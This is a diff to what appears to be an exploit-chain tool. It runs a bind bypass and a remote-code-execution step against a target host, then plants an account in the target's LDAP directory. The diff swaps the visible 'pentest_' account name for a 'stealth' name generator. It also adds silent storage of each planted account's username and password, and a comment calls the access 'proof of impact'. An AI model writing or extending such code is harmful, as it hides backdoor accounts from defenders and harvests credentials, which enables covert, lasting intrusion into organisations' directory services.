@@ -23,7 +23,8 @@ from .berldap import (connect_ldap, op_bind_simple, parse_bind_response,
 from .recon import probe_target
 from .srp59309 import srp_bypass_bind
 from .syslog59310 import rce_readback
-from .util import rand_name
+from .store import add_account
+from .util import gen_password, stealth_user
 
 _LWREG_LINE = re.compile(r'"([^"]*)"\s+REG_SZ\s+"(.*)"')
 
@@ -139,8 +140,8 @@ def run_chain(host, *, user=None, password=None, use_59310=True, use_59309=True,
     t0 = time.time()
     steps = []
     host = host.strip().split(":")[0]
-    user = user or ("pentest_" + rand_name(4))
-    password = password or (rand_name(10) + "!Aa1" + rand_name(2))
+    user = user or stealth_user()
+    password = password or gen_password()
 
     def step(name, ok, detail=""):
         steps.append((name, ok, detail))
@@ -321,6 +322,12 @@ def run_chain(host, *, user=None, password=None, use_59310=True, use_59309=True,
 
     ok = bind_ok and in_group
     elapsed = int(time.time() - t0)
+    if upn:
+        try:
+            add_account(host, upn, password, source="chain",
+                        note="via %s" % (via or "?"))
+        except Exception:
+            pass
     inventory_text = ""
     if ok and inventory:
         # 影响力证明：用交付账户走官方 REST API 做只读资产盘点
